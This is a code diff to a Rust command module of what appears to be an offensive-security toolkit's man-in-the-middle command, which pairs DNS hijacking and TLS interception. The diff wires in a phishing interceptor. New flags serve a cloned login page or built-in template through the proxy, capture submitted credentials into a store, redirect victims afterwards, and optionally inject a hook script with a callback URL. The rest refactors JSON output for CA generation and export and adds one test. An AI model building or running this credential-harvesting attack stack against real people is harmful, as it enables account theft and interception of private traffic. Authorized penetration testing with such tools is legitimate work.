@@ -7,12 +7,17 @@
 //! ⚠️ AUTHORIZED USE ONLY - For penetration testing with explicit permission
 
 use crate::cli::commands::{print_help, Command, Flag, Route};
-use crate::cli::{output::Output, validator::Validator, CliContext};
+use crate::cli::{output::Output, render, validator::Validator, CliContext};
 use crate::crypto::certs::ca::{CertificateAuthority, KeyAlgorithm};
 use crate::json;
 use crate::modules::dns::server::{DnsRule, DnsServer, DnsServerConfig};
+use crate::modules::exploit::phishing::interceptor::{
+  InterceptorCredentialStore, PhishingInterceptor, PhishingInterceptorConfig,
+};
+use crate::modules::exploit::phishing::templates as phish_templates;
 use crate::modules::proxy::mitm::{HookMode, LogFormat, MitmConfig, MitmProxy};
 use crate::modules::proxy::shell::MitmShell;
+use crate::serde_json::Value;
 use std::net::{IpAddr, SocketAddr};
 use std::path::{Path, PathBuf};
 use std::thread;
@@ -31,6 +36,29 @@ impl Command for MitmCommand {
 
   fn description(&self) -> &str {
     "Man-in-the-Middle attack toolkit: DNS hijacking + TLS interception (AUTHORIZED USE ONLY)"
+  }
+
+  fn metadata(&self) -> crate::cli::schema::CommandMetadata {
+    crate::cli::schema::CommandMetadata::new().with_machine_output(
+      crate::cli::schema::MachineOutputMetadata::new()
+        .with_json_support(crate::cli::schema::JsonSupport::BestEffort)
+        .with_stdout_policy(crate::cli::schema::StdoutPolicy::JsonOnlyWhenRequested)
+        .with_stderr_policy(crate::cli::schema::StderrPolicy::DiagnosticsOnly),
+    )
+  }
+
+  fn route_metadata(&self, verb: &str) -> crate::cli::schema::RouteMetadata {
+    let json_support = match verb {
+      "generate-ca" | "export-ca" => crate::cli::schema::JsonSupport::Guaranteed,
+      _ => crate::cli::schema::JsonSupport::BestEffort,
+    };
+
+    crate::cli::schema::RouteMetadata::new().with_machine_output(
+      crate::cli::schema::MachineOutputMetadata::new()
+        .with_json_support(json_support)
+        .with_stdout_policy(crate::cli::schema::StdoutPolicy::JsonOnlyWhenRequested)
+        .with_stderr_policy(crate::cli::schema::StderrPolicy::DiagnosticsOnly),
+    )
   }
 
   fn routes(&self) -> Vec<Route> {
@@ -115,6 +143,19 @@ impl Command for MitmCommand {
       Flag::new(
         "hook-callback",
         "RBB callback URL for same-origin mode (e.g. http://10.0.0.1:3000)",
+      ),
+      // Phishing integration
+      Flag::new(
+        "phish-page",
+        "Serve a cloned phishing page instead of proxying (HTML file path)",
+      ),
+      Flag::new(
+        "phish-redirect",
+        "Redirect URL after credential capture (used with --phish-page)",
+      ),
+      Flag::new(
+        "phish-paths",
+        "Comma-separated paths to intercept (default: /). e.g. /,/login,/signin",
       ),
     ]
   }
@@ -292,6 +333,9 @@ impl MitmCommand {
     // Configure hook injection mode
     proxy_config = self.configure_hook_mode(ctx, proxy_config)?;
 
+    // Configure phishing interceptor if --phish-page is provided
+    proxy_config = self.configure_phishing(ctx, proxy_config)?;
+
     // Start services
     Output::success("Starting MITM attack stack...");
     println!();
@@ -433,6 +477,9 @@ impl MitmCommand {
     // Configure hook injection mode
     config = self.configure_hook_mode(ctx, config)?;
 
+    // Configure phishing interceptor
+    config = self.configure_phishing(ctx, config)?;
+
     let proxy = MitmProxy::new(config);
     proxy.run().map_err(|e| format!("Proxy error: {}", e))
   }
@@ -499,12 +546,8 @@ impl MitmCommand {
       .map_err(|e| format!("Failed to write key: {}", e))?;
 
     if is_json {
-      Output::json_value(&json!({
-          "certificate_path": cert_path.display().to_string(),
-          "key_path": key_path.display().to_string(),
-          "subject": ca.subject(),
-          "fingerprint": ca.fingerprint()
-      }));
+      let payload = generated_ca_payload(&cert_path, &key_path, &ca);
+      render::render_machine_output(ctx, "rb mitm intercept generate-ca", &payload)?;
       return Ok(());
     }
 
@@ -575,18 +618,18 @@ impl MitmCommand {
     };
 
     if is_json {
-      let exported_to = if output_path.is_empty() {
-        None
-      } else {
-        Some(output_path.clone())
-      };
-      Output::json_value(&json!({
-          "source": ca_cert_path.clone(),
-          "subject": subject.to_string(),
-          "fingerprint": fingerprint,
-          "exported_to": exported_to,
-          "export_format": export_format
-      }));
+      let payload = exported_ca_payload(
+        &ca_cert_path,
+        subject,
+        &fingerprint,
+        if output_path.is_empty() {
+          None
+        } else {
+          Some(output_path.as_str())
+        },
+        &export_format,
+      );
+      render::render_machine_output(ctx, "rb mitm intercept export-ca", &payload)?;
       return Ok(());
     }
 
@@ -692,5 +735,125 @@ impl MitmCommand {
     }
 
     Ok(config)
+  }
+
+  /// Configure phishing interceptor if --phish-page is provided
+  fn configure_phishing(
+    &self,
+    ctx: &CliContext,
+    mut config: MitmConfig,
+  ) -> Result<MitmConfig, String> {
+    let phish_page = match ctx.get_flag("phish-page") {
+      Some(page) => page,
+      None => return Ok(config),
+    };
+
+    // Load the HTML: from file, built-in template name, or URL
+    let html = if std::path::Path::new(&phish_page).exists() {
+      std::fs::read_to_string(&phish_page)
+        .map_err(|e| format!("Failed to read phish page '{}': {}", phish_page, e))?
+    } else if let Some(tpl) = phish_templates::get_template(&phish_page) {
+      tpl.to_string()
+    } else {
+      return Err(format!(
+        "Phish page '{}' not found. Provide a file path or template name (generic|corporate|oauth)",
+        phish_page
+      ));
+    };
+
+    let redirect_url = ctx
+      .get_flag("phish-redirect")
+      .unwrap_or_else(|| "https://www.google.com".to_string());
+
+    let intercept_paths: Vec<String> = ctx
+      .get_flag("phish-paths")
+      .map(|p| p.split(',').map(|s| s.trim().to_string()).collect())
+      .unwrap_or_else(|| vec!["/".to_string()]);
+
+    // Render template placeholders
+    let mut vars = std::collections::HashMap::new();
+    vars.insert(
+      "ACTION_URL".to_string(),
+      intercept_paths
+        .first()
+        .cloned()
+        .unwrap_or_else(|| "/".to_string()),
+    );
+    vars.insert("REDIRECT_URL".to_string(), redirect_url.clone());
+    vars.insert("COMPANY_NAME".to_string(), "Company Portal".to_string());
+    vars.insert("LOGO_URL".to_string(), String::new());
+    let html = phish_templates::render_template(&html, &vars);
+
+    // Determine if hook should be injected into the phish page
+    // The hook_callback comes from --hook-callback flag
+    let hook_callback_url = ctx.get_flag("hook-callback");
+    let inject_hook = hook_callback_url.is_some();
+
+    Output::subheader("Phishing Interceptor");
+    Output::item("Page", &phish_page);
+    Output::item("Redirect", &redirect_url);
+    Output::item("Intercept Paths", &intercept_paths.join(", "));
+    if inject_hook {
+      Output::item("Hook", "injected into phish page");
+    }
+    println!();
+
+    let store = InterceptorCredentialStore::new();
+    let interceptor_config = PhishingInterceptorConfig {
+      html,
+      redirect_url,
+      intercept_paths,
+      inject_hook,
+      hook_callback_url,
+    };
+
+    let interceptor = PhishingInterceptor::new(interceptor_config, store);
+    config = config.with_interceptor(interceptor);
+
+    Ok(config)
+  }
+}
+
+fn generated_ca_payload(cert_path: &Path, key_path: &Path, ca: &CertificateAuthority) -> Value {
+  json!({
+    "certificate_path": cert_path.display().to_string(),
+    "key_path": key_path.display().to_string(),
+    "subject": ca.subject(),
+    "fingerprint": ca.fingerprint()
+  })
+}
+
+fn exported_ca_payload(
+  source: &str,
+  subject: &str,
+  fingerprint: &str,
+  exported_to: Option<&str>,
+  export_format: &str,
+) -> Value {
+  json!({
+    "source": source,
+    "subject": subject,
+    "fingerprint": fingerprint,
+    "exported_to": exported_to,
+    "export_format": export_format
+  })
+}
+
+#[cfg(test)]
+mod tests {
+  use super::*;
+
+  #[test]
+  fn exported_ca_payload_keeps_optional_target() {
+    let payload = exported_ca_payload(
+      "ca.pem",
+      "redblue MITM CA",
+      "sha256:123",
+      Some("mitm-ca-export.der"),
+      "der",
+    );
+    assert_eq!(payload["source"], json!("ca.pem"));
+    assert_eq!(payload["exported_to"], json!("mitm-ca-export.der"));
+    assert_eq!(payload["export_format"], json!("der"));
   }
 }
